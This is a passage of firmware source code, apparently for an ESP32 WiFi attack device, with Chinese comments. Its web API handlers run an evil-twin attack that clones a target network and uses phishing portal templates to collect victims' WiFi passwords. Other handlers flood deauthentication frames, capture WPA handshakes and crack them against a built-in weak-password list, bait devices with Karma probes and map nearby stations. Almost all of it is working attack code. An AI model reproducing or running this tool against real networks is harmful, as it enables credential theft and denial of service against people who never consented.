  sEvilTwin.cloneSsid = sTarget.ssid;
  sDeauth.targetBssid = sTarget.bssid;
  sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
  log("[target] 已设置主目标: " + (sTarget.ssid.length() ? sTarget.ssid : "(隐藏)") +
      " @ch" + String(sTarget.channel) + " " + sTarget.bssid);
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"role\":\"primary\"}");
}

/* 双子目标列表: POST 添加/覆盖, DELETE 移除单条或清空 */
static void handleTwinAdd() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");
  String bssid = extractJson(body, "bssid");
  String ssid  = extractJson(body, "ssid");
  bssid.trim(); ssid.trim();
  int channel = extractJson(body, "channel").toInt();
  bool fakeAp = (extractJson(body, "fakeAp") == "true");

  if (channel < 1 || channel > 177) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"双子目标需要有效信道\"}");
    return;
  }
  if (bssid.length() == 0 && !fakeAp) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"双子目标需要 BSSID (假 AP 可留空自动生成)\"}");
    return;
  }

  int idx = (bssid.length() ? twinFindByBssid(bssid) : -1);
  if (idx < 0) idx = twinFirstFree();
  if (idx < 0) {
    server.send(409, "application/json", "{\"ok\":false,\"error\":\"双子目标已达上限 4 条, 请先移除一条\"}");
    return;
  }
  TwinTarget &tw = sTwins[idx];
  tw.used    = true;
  tw.ssid    = ssid;
  tw.bssid   = bssid;
  tw.channel = channel;
  tw.auth    = extractJson(body, "auth");
  tw.rssi    = extractJson(body, "rssi").toInt();
  tw.fakeAp  = fakeAp;
  log("[twin] 已加入双子目标: " + (ssid.length() ? ssid : "(隐藏)") +
      " @ch" + String(channel) + " " + (bssid.length() ? bssid : "(假AP 自动 MAC)") +
      (fakeAp ? " [假AP]" : "") + " 共 " + String(twinCount()) + " 条");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"index\":" + String(idx) +
              ",\"count\":" + String(twinCount()) + "}");
}

static void handleTwinRemove() {
  String body = server.hasArg("plain") ? server.arg("plain") : String();
  String bssid = body.length() ? extractJson(body, "bssid") : String();
  bssid.trim();
  if (bssid.length() == 0) {
    for (int i = 0; i < MAX_TWINS; i++) sTwins[i] = TwinTarget();
    log("[twin] 已清空全部双子目标");
  } else {
    int idx = twinFindByBssid(bssid);
    if (idx >= 0) {
      twinRemoveAt(idx);
      log("[twin] 已移除双子目标 " + bssid + ", 剩 " + String(twinCount()) + " 条");
    }
  }
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"count\":" + String(twinCount()) + "}");
}

/* ---------------- 1. 邪恶双子 API ---------------- */
static void handleEvilTwinStart() {
  String ssid;
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    ssid = extractJson(body, "cloneSsid");
    // 攻击准备 = 钓鱼门户模板 (1=固件升级 2=认证过期 3=网络拥堵重连)
    int tpl = extractJson(body, "template").toInt();
    if (tpl >= 1 && tpl <= 3) sEvilTwin.templateId = tpl;
  }
  if (ssid.length() > 32) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"克隆 SSID 最长 32 字节\"}");
    return;
  }
  // 后台「克隆 SSID」输入框: 有值 = 显式覆盖; 留空 = 跟随主目标 SSID,
  // 避免沿用上一次攻击留下的自定义名称
  sEvilTwin.cloneSsid = ssid.length() ? ssid : sTarget.ssid;
  if (sEvilTwin.cloneSsid.length() == 0 && sTarget.ssid.length()) {
    sEvilTwin.cloneSsid = sTarget.ssid;
  }
  if (sEvilTwin.active) {
    server.send(409, "application/json", "{\"ok\":false,\"error\":\"攻击已在进行中, 请先停止\"}");
    return;
  }
  String err;
  if (!eviltwinStartAttack(err)) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"" + jsonEscape(err) + "\"}");
    return;
  }
  sEvilTwin.active = true;
  sEvilTwin.startTime = millis();
  emitLabState("eviltwin", true);
  log("[eviltwin] 攻击已发起! 克隆热点=" + sEvilTwin.cloneSsid + " (开放无密码 @ch" +
      String(sTarget.channel) + "), 主目标持续 Deauth, 双子目标 " + String(twinCount()) + " 条" +
      (sEvilTwin.hopEnabled ? " 已启用跳频轮播" : " (无有效条目, 仅 2.4G 单频段攻击)") +
      " — 等待目标设备接入并在门户输入密码");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              "{\"ok\":true,\"active\":true,\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
              "\",\"apCloned\":true,\"channel\":" + String(sTarget.channel) +
              ",\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
              ",\"twinHop\":" + String(sEvilTwin.hopEnabled ? "true" : "false") +
              ",\"twins\":" + String(twinCount()) + "}");
}

static void handleEvilTwinStop() {
  eviltwinStopAttack(true);
  sEvilTwin.active = false;
  emitLabState("eviltwin", false);
  log("[eviltwin] 攻击已停止, 已恢复原热点 " + apSsid + " (ch" + String(apChannel) +
      ") 累计: 主目标 Deauth " + String(sDeauth.frameCount) + " 帧, 双子跳频 " +
      String(sEvilTwin.hopCount) + " 次 / " + String(sEvilTwin.twinFrameCount) + " 帧");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"active\":false}");
}

static void handleEvilTwinCreds() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json = "{\"credentials\":[";
  uint32_t now = millis();
  for (int i = 0; i < sCredCount; i++) {
    int idx = (sCredHead + 16 - sCredCount + i) % 16;
    if (i) json += ",";
    uint32_t elapsedSec = (now >= sCreds[idx].capturedAt) ? ((now - sCreds[idx].capturedAt) / 1000) : 0;
    String timeStr = (elapsedSec < 3) ? "刚刚" : (String(elapsedSec) + "秒前");
    json += "{\"id\":" + String(sCreds[idx].id) +
            ",\"mac\":\"" + jsonEscape(String(sCreds[idx].mac)) +
            "\",\"pass\":\"" + jsonEscape(String(sCreds[idx].pass)) +
            "\",\"time\":\"" + jsonEscape(timeStr) + "\"}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

static void handleEvilTwinClearCreds() {
  sCredHead = 0;
  sCredCount = 0;
  log("[eviltwin] 捕获凭据已清空");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true}");
}

/* ---------------- 2. 取消认证器 API ---------------- */
static void handleDeauthStart() {
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    String b = extractJson(body, "bssid");
    if (b.length()) sDeauth.targetBssid = b;
    int ch = extractJson(body, "channel").toInt();
    if (ch > 0) sDeauth.targetChannel = ch;
    int r = extractJson(body, "reason").toInt();
    if (r > 0) sDeauth.reasonCode = r;
    int rate = extractJson(body, "rate").toInt();
    if (rate >= 1 && rate <= 100) sDeauth.rateLimitMs = 1000 / rate;
    if (sDeauth.rateLimitMs == 0) sDeauth.rateLimitMs = 10;
  }
  if (sDeauth.targetBssid.length() == 0 && sTarget.bssid.length()) {
    sDeauth.targetBssid = sTarget.bssid;
    sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
  }
  // 预构 Deauth 管理帧; BSSID 非法则不发送 (只报告, 不再空转计数)
  buildDeauthFrame(sDeauth);
  sDeauth.txOk = false;
  sDeauth.lastTxErr = 0;
  // 信道对齐: 单射频只能在本机信道发帧 → 攻击前把热点临时切到目标信道, 停止时恢复配置信道
  bool channelAligned = false;
  sDeauth.channelMoved = false;
  sDeauth.restoreChannel = apChannelActive;
  if (sDeauth.frameReady && sDeauth.targetChannel != apChannelActive) {
    if (applyApChannel(sDeauth.targetChannel)) {
      sDeauth.channelMoved = true;
      channelAligned = true;
    }
  }
  const bool channelMismatch = (sDeauth.frameReady && sDeauth.targetChannel != apChannelActive);
  sDeauth.running = true;
  sDeauth.frameCount = 0;
  sDeauth.lastTxTime = millis();
  emitLabState("deauth", true);
  log("[deauth] 取消认证器已启动! " + String(sDeauth.frameReady ? "真实帧注入" : "目标 BSSID 无效, 无法注入") +
      " 目标=" + sDeauth.targetBssid + " ch=" + String(sDeauth.targetChannel) + " 原因码=" + String(sDeauth.reasonCode) +
      (channelAligned ? " (已对齐目标: AP 信道切至 ch" + String(apChannelActive) + ", 已连设备将短暂掉线)" : "") +
      (channelMismatch ? " (信道对齐失败: 帧仍只能在 ch" + String(apChannelActive) + " 发出, 目标收不到)" : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              "{\"ok\":true,\"running\":true,\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
              ",\"txChannel\":" + String(apChannelActive) +
              ",\"channelAligned\":" + String(channelAligned ? "true" : "false") +
              ",\"channelMismatch\":" + String(channelMismatch ? "true" : "false") + "}");
}

static void handleDeauthStop() {
  sDeauth.running = false;
  bool channelRestored = false;
  // 双子攻击进行中: 信道归属由攻击引擎管理, 此处切信道会破坏克隆热点对齐
  const bool ownedByEvilTwin = (sEvilTwin.active && sEvilTwin.deauthAuto);
  if (sDeauth.channelMoved && !ownedByEvilTwin) {
    channelRestored = applyApChannel(sDeauth.restoreChannel);
    sDeauth.channelMoved = false;
  }
  if (ownedByEvilTwin) {
    // 若正处双子跳频窗口, 先回到主目标信道, 否则克隆热点会停在 5G 信道上
    if (sEvilTwin.hopping) {
      applyApChannel(sDeauth.targetChannel);
      sEvilTwin.hopping = false;
    }
    sEvilTwin.deauthAuto = false;
    sEvilTwin.hopEnabled = false;   // 手动停掉 Deauth = 停止压制, 跳频一并停
  }
  emitLabState("deauth", false);
  log("[deauth] 取消认证器已停止, 累计发送 " + String(sDeauth.frameCount) + " 帧" +
      (channelRestored ? ", AP 信道已恢复 ch" + String(apChannelActive) : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":false,\"count\":" + String(sDeauth.frameCount) +
              ",\"channelRestored\":" + String(channelRestored ? "true" : "false") +
              ",\"txChannel\":" + String(apChannelActive) + "}");
}

static void handleDeauthStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json = "{";
  json += "\"running\":" + String(sDeauth.running ? "true" : "false") + ",";
  json += "\"count\":" + String(sDeauth.frameCount) + ",";
  json += "\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) + ",";
  json += "\"bssid\":\"" + jsonEscape(sDeauth.targetBssid) + "\",";
  json += "\"channel\":" + String(sDeauth.targetChannel) + ",";
  json += "\"reason\":" + String(sDeauth.reasonCode) + ",";
  json += "\"injected\":" + String(sDeauth.frameReady ? "true" : "false") + ",";
  json += "\"txOk\":" + String(sDeauth.txOk ? "true" : "false") + ",";
  json += "\"txErr\":" + String(sDeauth.lastTxErr) + ",";
  json += "\"txChannel\":" + String(apChannelActive) + ",";
  json += "\"channelMoved\":" + String(sDeauth.channelMoved ? "true" : "false");
  json += "}";
  server.send(200, "application/json", json);
}

/* ---------------- 3. 握手包与密码破解 API ---------------- */
// 启动握手监听 (不发送 HTTP 响应, 供 /api/handshake/start 与 Karma 复用)
// 返回 false 表示参数不合法 (err 为中文原因); 返回 true 时结果看 sHandshake.capturing。
static bool beginHandshakeCapture(String &err) {
  if (!sTarget.set || sTarget.ssid.length() == 0) {
    err = "请先扫描并选择目标 AP — 跑包需要它的 SSID 作为 PBKDF2 盐值";
    return false;
  }
  uint8_t bssid[6];
  if (!parseBssid(sTarget.bssid, bssid)) {
    err = "目标 BSSID 无效, 请重新选择目标";
    return false;
  }

  sHandshake.m1 = sHandshake.m2 = sHandshake.m3 = sHandshake.m4 = false;
  sHandshake.pmkid = false;
  sHandshake.captured = false;
  sHandshake.unsupported = false;
  sHandshake.cracking = false;
  sHandshake.crackedPass = "";
  sHandshake.crackProgress = 0;
  sHandshake.crackAttempts = 0;
  sHandshake.eapolLen = 0;
  sHandshake.frameCount = 0;
  sHandshake.keyver = 2;
  sHandshake.essid = sTarget.ssid;
  memcpy(sHandshake.targetBssid, bssid, 6);
  sHandshake.hasTarget = true;
  sHandshake.captureStartTime = millis();
  sHsLoggedM1 = sHsLoggedM2 = sHsLoggedDone = false;

  // 单射频: 先对齐到目标信道, 再打开 promiscuous (握手帧走数据帧)
  sHandshake.restoreChannel = apChannelActive;
  const bool needMove = (sTarget.channel > 0 && sTarget.channel != apChannelActive);
  // 注意: 必须先判断 needMove 再切换, 切换后 apChannelActive 已等于目标信道
  sHandshake.channelMoved = needMove && applyApChannel((uint8_t)sTarget.channel);
  const bool channelAligned = !needMove || sHandshake.channelMoved;
  sHandshake.capturing = true;
  if (!syncPromiscuousEngine()) sHandshake.capturing = false;

  emitLabState("handshake", sHandshake.capturing);
  log(String("[eapol] 开始监听 4-Way Handshake: 目标=") + sTarget.ssid +
      " ch=" + String(apChannelActive) + (sHandshake.capturing ? "" : " (promiscuous 启动失败)"));
  if (!channelAligned) {
    log("[eapol] 警告: 未能切到目标信道 ch" + String(sTarget.channel) + ", 当前仍在 ch" +
        String(apChannelActive) + ", 抓不到该网络的握手帧");
  }
  log("[eapol] 提示: 用 Deauther 让目标客户端重连, 即可在空中抓到 M1/M2");
  return true;
}

static void handleHandshakeStart() {
  String err;
  if (!beginHandshakeCapture(err)) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json", "{\"error\":\"" + jsonEscape(err) + "\"}");
    return;
  }
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              String("{\"ok\":true,\"capturing\":") + (sHandshake.capturing ? "true" : "false") +
              ",\"channel\":" + String(apChannelActive) +
              ",\"channelAligned\":" + ((!sHandshake.channelMoved) ? "true" : "false") +
              ",\"channelMoved\":" + (sHandshake.channelMoved ? "true" : "false") +
              ",\"essid\":\"" + jsonEscape(sHandshake.essid) + "\"}");
}

static void handleHandshakeStop() {
  stopCaptureEngine();
  sHandshake.cracking = false;
  emitLabState("handshake", false);
  log("[eapol] 停止握手包监听, 累计收到 " + String(sHandshake.frameCount) + " 个 EAPOL-Key 帧" +
      (sHandshake.captured ? ", 已具备跑包条件" : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              String("{\"ok\":true,\"capturing\":false,\"captured\":") +
              (sHandshake.captured ? "true" : "false") +
              ",\"frames\":" + String(sHandshake.frameCount) + "}");
}

static void handleHandshakeCrack() {
  if (!sHandshake.captured) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json",
                "{\"error\":\"尚未捕获到完整的 M1+M2 — 请先开始监听, 再用 Deauther 触发客户端重连\"}");
    return;
  }
  if (sHandshake.unsupported) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json",
                "{\"error\":\"该网络使用 802.11w PMF (keyver 3), 板载跑包不支持; "
                "请用 /api/handshake/dump 导出后交服务端 /api/wpa/crack\"}");
    return;
  }
  sKarma.running = false;  // 跑包期间停止 Karma, 避免 promiscuous 与 PBKDF2 同时占用射频/CPU
  stopCaptureEngine();     // 帧已保存, 跑包期间释放射频监听, 避免与 PBKDF2 抢 CPU
  sHandshake.cracking = true;
  sHandshake.crackProgress = 0;
  sHandshake.crackAttempts = 0;
  sHandshake.crackedPass = "";
  sHandshake.crackStartTime = millis();
  log("[crack] 开始用内置 " + String(sHandshake.crackTotal) + " 条弱口令跑包 (PMK=PBKDF2-HMAC-SHA1 4096 轮) …");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              String("{\"ok\":true,\"cracking\":true,\"total\":") + String(sHandshake.crackTotal) + "}");
}

// 握手状态已由 /api/info 的 handshake 字段统一提供 (面板按 2s 轮询),
// 不再单独维护 /api/handshake/status 这条无人调用的冗余路由。

// 导出捕获到的握手材料 (十六进制), 可直接 POST 给服务端 /api/wpa/crack
static void handleHandshakeDump() {
  if (!sHandshake.captured) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json", "{\"error\":\"尚未捕获到完整的 M1+M2\"}");
    return;
  }
  String json;
  json.reserve(1200);
  json = "{\"essid\":\"" + jsonEscape(sHandshake.essid) + "\",";
  json += "\"bssid\":\"" + hexBytes(sHandshake.bssid, 6) + "\",";
  json += "\"stmac\":\"" + hexBytes(sHandshake.stmac, 6) + "\",";
  json += "\"anonce\":\"" + hexBytes(sHandshake.anonce, 32) + "\",";
  json += "\"snonce\":\"" + hexBytes(sHandshake.snonce, 32) + "\",";
  json += "\"keyver\":" + String(sHandshake.keyver) + ",";
  json += "\"mic\":\"" + hexBytes(sHandshake.eapol + 81, 16) + "\",";
  json += "\"eapol\":\"" + hexBytes(sHandshake.eapol, sHandshake.eapolLen) + "\"}";
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

/* ---------------- Sniffer API ---------------- */
static void handleSnifferStart() {
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    uint8_t band = parseBandArg(extractJson(body, "band"));
#if !SOC_WIFI_SUPPORT_5G
    if (band == 5) {
      server.sendHeader("Access-Control-Allow-Origin", "*");
      server.send(400, "application/json", "{\"ok\":false,\"error\":\"本芯片仅支持 2.4GHz\"}");
      return;
    }
#endif
    String chStr = extractJson(body, "channel");
    if (chStr.length()) {
      int ch = chStr.toInt();
      if (!isValidSniffChannel(ch)) {
        server.sendHeader("Access-Control-Allow-Origin", "*");
#if SOC_WIFI_SUPPORT_5G
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 2.4G 用 1-14, 5G 用 36-165\"}");
#else
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 本芯片仅支持 2.4G 信道 1-14\"}");
#endif
        return;
      }
      sSniffer.channel = (uint8_t)ch;
    }
    String hopStr = extractJson(body, "hopping");
    sSniffer.hopping = (hopStr == "true" || hopStr == "1");
    String dfsStr = extractJson(body, "skipDfs");
    if (dfsStr.length()) sSniffer.skipDfs = (dfsStr != "false" && dfsStr != "0");
    // 跳频模式: band 决定起点频段 (未指定时沿用当前信道所在频段)
    if (sSniffer.hopping) {
      sSniffer.channel = hopStartChannel(band, sSniffer.channel);
      // 显式指定频段时立即对齐起点, 避免「状态已切 5G、空口还在 2.4G」的短暂不一致
      if (band && !sHandshake.capturing) applyApChannel(sSniffer.channel);
    }
  }
  if (!sSniffer.hopping && !sHandshake.capturing) applyApChannel(sSniffer.channel);
  sSniffer.running = true;
  sSniffer.lastFpsCalc = millis();
  sSniffer.lastHopTime = millis();
  sSniffer.fpsAccum = 0;
  sSniffer.fps = 0;
  if (!syncPromiscuousEngine()) {
    sSniffer.running = false;
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(500, "application/json", "{\"ok\":false,\"error\":\"promiscuous 启动失败\"}");
    return;
  }
  log("[sniffer] 数据包分析器已启动! 信道=" + String(sSniffer.channel) +
      (isBand5G(sSniffer.channel) ? " (5G)" : " (2.4G)") +
      (sSniffer.hopping ? (sSniffer.skipDfs ? " (跳频, 跳过 DFS)" : " (跳频)") : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":true}");
}

static void handleSnifferStop() {
  sSniffer.running = false;
  syncPromiscuousEngine();
  if (!sHandshake.capturing && !sDeauth.running && !sEvilTwin.active) applyApChannel(apChannel);
  log("[sniffer] 数据包分析器已停止, 累计捕获 " + String(sSniffer.totalPackets) + " 帧");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":false}");
}

static void handleSnifferStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(1024);
  json = "{\"running\":" + String(sSniffer.running ? "true" : "false") + ",";
  json += "\"channel\":" + String(sSniffer.channel) + ",";
  json += "\"band\":" + String(isBand5G(sSniffer.channel) ? 5 : 2) + ",";
  json += "\"hopping\":" + String(sSniffer.hopping ? "true" : "false") + ",";
  json += "\"skipDfs\":" + String(sSniffer.skipDfs ? "true" : "false") + ",";
  json += "\"total\":" + String(sSniffer.totalPackets) + ",";
  json += "\"mgmt\":" + String(sSniffer.mgmtCount) + ",";
  json += "\"ctrl\":" + String(sSniffer.ctrlCount) + ",";
  json += "\"data\":" + String(sSniffer.dataCount) + ",";
  json += "\"fps\":" + String(sSniffer.fps) + ",";
  json += "\"packets\":[";
  for (int i = 0; i < sSniffer.packetCount; i++) {
    int idx = (sSniffer.packetHead + 16 - sSniffer.packetCount + i) % 16;
    if (i) json += ",";
    json += "{\"ts\":" + String(sSniffer.packets[idx].ts) + ",";
    json += "\"ch\":" + String(sSniffer.packets[idx].ch) + ",";
    json += "\"rssi\":" + String(sSniffer.packets[idx].rssi) + ",";
    json += "\"type\":\"" + jsonEscape(sSniffer.packets[idx].type) + "\",";
    json += "\"src\":\"" + jsonEscape(sSniffer.packets[idx].src) + "\",";
    json += "\"dst\":\"" + jsonEscape(sSniffer.packets[idx].dst) + "\",";
    json += "\"info\":\"" + jsonEscape(sSniffer.packets[idx].info) + "\"}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

/* ---------------- Airodump API ---------------- */
static void handleAirodumpStart() {
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    uint8_t band = parseBandArg(extractJson(body, "band"));
#if !SOC_WIFI_SUPPORT_5G
    if (band == 5) {
      server.sendHeader("Access-Control-Allow-Origin", "*");
      server.send(400, "application/json", "{\"ok\":false,\"error\":\"本芯片仅支持 2.4GHz\"}");
      return;
    }
#endif
    String hopStr = extractJson(body, "hopping");
    sAirodump.hopping = (hopStr != "false" && hopStr != "0");
    String chStr = extractJson(body, "channel");
    if (chStr.length()) {
      int ch = chStr.toInt();
      if (!isValidSniffChannel(ch)) {
        server.sendHeader("Access-Control-Allow-Origin", "*");
#if SOC_WIFI_SUPPORT_5G
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 2.4G 用 1-14, 5G 用 36-165\"}");
#else
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 本芯片仅支持 2.4G 信道 1-14\"}");
#endif
        return;
      }
      sAirodump.currentChannel = (uint8_t)ch;
    }
    String dfsStr = extractJson(body, "skipDfs");
    if (dfsStr.length()) sAirodump.skipDfs = (dfsStr != "false" && dfsStr != "0");
    // 跳频模式: band 决定起点频段 (未指定时沿用当前信道所在频段)
    if (sAirodump.hopping) {
      sAirodump.currentChannel = hopStartChannel(band, sAirodump.currentChannel);
      // 显式指定频段时立即对齐起点, 避免「状态已切 5G、空口还在 2.4G」的短暂不一致
      if (band && !sHandshake.capturing) applyApChannel(sAirodump.currentChannel);
    }
  }
  sAirodump.stationCount = 0;
  if (!sAirodump.hopping && !sHandshake.capturing) applyApChannel(sAirodump.currentChannel);
  sAirodump.running = true;
  sAirodump.lastHopTime = millis();
  if (!syncPromiscuousEngine()) {
    sAirodump.running = false;
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(500, "application/json", "{\"ok\":false,\"error\":\"promiscuous 启动失败\"}");
    return;
  }
  log("[airodump] Airodump侦察已启动! 初始信道=" + String(sAirodump.currentChannel) +
      (isBand5G(sAirodump.currentChannel) ? " (5G)" : " (2.4G)") +
      (sAirodump.hopping ? (sAirodump.skipDfs ? " (自动跳频, 跳过 DFS)" : " (自动跳频)") : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":true}");
}

static void handleAirodumpStop() {
  sAirodump.running = false;
  syncPromiscuousEngine();
  if (!sHandshake.capturing && !sDeauth.running && !sEvilTwin.active) applyApChannel(apChannel);
  log("[airodump] Airodump侦察已停止, 记录 " + String(sAirodump.stationCount) + " 个对端");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":false}");
}

static void handleAirodumpStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(2048);
  json = "{\"running\":" + String(sAirodump.running ? "true" : "false") + ",";
  json += "\"channel\":" + String(sAirodump.currentChannel) + ",";
  json += "\"band\":" + String(isBand5G(sAirodump.currentChannel) ? 5 : 2) + ",";
  json += "\"hopping\":" + String(sAirodump.hopping ? "true" : "false") + ",";
  json += "\"skipDfs\":" + String(sAirodump.skipDfs ? "true" : "false") + ",";
  json += "\"stations\":[";
  for (int i = 0; i < sAirodump.stationCount; i++) {
    if (i) json += ",";
    json += "{\"mac\":\"" + jsonEscape(sAirodump.stations[i].mac) + "\",";
    json += "\"bssid\":\"" + jsonEscape(sAirodump.stations[i].bssid) + "\",";
    json += "\"rssi\":" + String(sAirodump.stations[i].rssi) + ",";
    json += "\"packets\":" + String(sAirodump.stations[i].packets) + ",";
    json += "\"probes\":\"" + jsonEscape(sAirodump.stations[i].probes) + "\"}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

/* ---------------- Karma API ---------------- */
static void handleKarmaStart() {
  sKarma.probesCaptured = 0;
  sKarma.probesBaited = 0;
  sKarma.probeCount = 0;
  sKarma.probeHead = 0;
  sKarma.running = true;   // 先置位, 使 promiscuous 过滤包含管理帧
  // 已选择目标时顺带启动 4-Way Handshake 捕获; 未选目标则只监听 Probe Request
  if (sTarget.set && sTarget.ssid.length()) {
    String err;
    if (!beginHandshakeCapture(err)) {
      log("[karma] 握手捕获未启动: " + err + " (仍继续监听 Probe Request)");
    }
  }
  if (!syncPromiscuousEngine()) {
    sKarma.running = false;
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(500, "application/json", "{\"ok\":false,\"error\":\"promiscuous 启动失败\"}");
    return;
  }
  log("[karma] Karma 探针诱捕已启动 (真实 promiscuous): 信道 " + String(apChannelActive) +
      (sHandshake.capturing ? ", 同时监听 4-Way Handshake" : ", 仅监听 Probe Request"));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              "{\"ok\":true,\"running\":true,\"channel\":" + String(apChannelActive) +
              ",\"handshake\":" + (sHandshake.capturing ? "true" : "false") + "}");
}

static void handleKarmaStop() {
  sKarma.running = false;
  stopCaptureEngine();      // 停止握手监听并恢复信道 (内部含 sync, 不会重复 send)
  sHandshake.cracking = false;
  emitLabState("handshake", false);
  log("[karma] Karma 探针诱捕已停止, 累计捕获 " + String(sKarma.probesCaptured) + " 个 Probe Request");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":false}");
}

static void handleKarmaStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(1200);
  json = "{\"running\":" + String(sKarma.running ? "true" : "false") + ",";
  json += "\"capturing\":" + String(sHandshake.capturing ? "true" : "false") + ",";
  json += "\"m1\":" + String(sHandshake.m1 ? "true" : "false") + ",";
  json += "\"m2\":" + String(sHandshake.m2 ? "true" : "false") + ",";
  json += "\"m3\":" + String(sHandshake.m3 ? "true" : "false") + ",";
  json += "\"m4\":" + String(sHandshake.m4 ? "true" : "false") + ",";
  json += "\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") + ",";
  json += "\"captured\":" + String(sHandshake.captured ? "true" : "false") + ",";
  json += "\"keyver\":" + String(sHandshake.keyver) + ",";
  json += "\"cracking\":" + String(sHandshake.cracking ? "true" : "false") + ",";
  json += "\"progress\":" + String(sHandshake.crackProgress) + ",";
  json += "\"attempts\":" + String(sHandshake.crackAttempts) + ",";
  json += "\"total\":" + String(sHandshake.crackTotal) + ",";
  json += "\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\",";
  json += "\"probesCaptured\":" + String(sKarma.probesCaptured) + ",";
  json += "\"probesBaited\":" + String(sKarma.probesBaited) + ",";
  json += "\"probes\":[";
  for (int i = 0; i < sKarma.probeCount; i++) {
    int idx = (sKarma.probeHead + 10 - sKarma.probeCount + i) % 10;
    if (i) json += ",";
    json += "{\"mac\":\"" + jsonEscape(sKarma.probes[idx].mac) + "\",";
    json += "\"ssid\":\"" + jsonEscape(sKarma.probes[idx].ssid) + "\",";
    json += "\"rssi\":" + String(sKarma.probes[idx].rssi) + ",";
    json += "\"ts\":" + String(sKarma.probes[idx].ts) + ",";
    json += "\"baited\":" + String(sKarma.probes[idx].baited ? "true" : "false") + "}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

static void handleLog() {
  uint32_t since = 0;
  if (server.hasArg("since")) since = (uint32_t)atol(server.arg("since").c_str());
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(2048);
  json = "{\"entries\":[";
  int n = sizeof(sLogs) / sizeof(sLogs[0]);
  int cnt = 0;
  for (int i = n; i > 0; i--) {
    uint8_t idx = (sLogHead + n - i) % n;
    if (sLogs[idx].id == 0 || sLogs[idx].id <= since) continue;
    if (cnt) json += ",";
    json += "{\"id\":" + String(sLogs[idx].id) + ",\"line\":\"" +
            jsonEscape(String(sLogs[idx].line)) + "\"}";
    cnt++;
  }
  json += "]}";
  server.send(200, "application/json", json);
}

/* ---------------- 4. 系统配置与持久化 (NVS Preferences) ---------------- */
// 出厂初始口令: 每台设备首次上电用硬件 TRNG 随机生成并写入 NVS, 各设备互不相同。
// 仅在物理串口启动日志中打印一次 (Serial 直出, 不经 log() → 不进入 NDJSON 遥测与 /api/log)。
// 生成时机必须在 WiFi.softAP() 之后: RF 已开启, esp_random() 的熵才充足。
static const char TOKEN_ALPHABET[] =
    "23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"; // 剔除 0/O/1/l/I 等易混淆字符
static String makeRandomAdminToken() {
  String t;
  t.reserve(13);
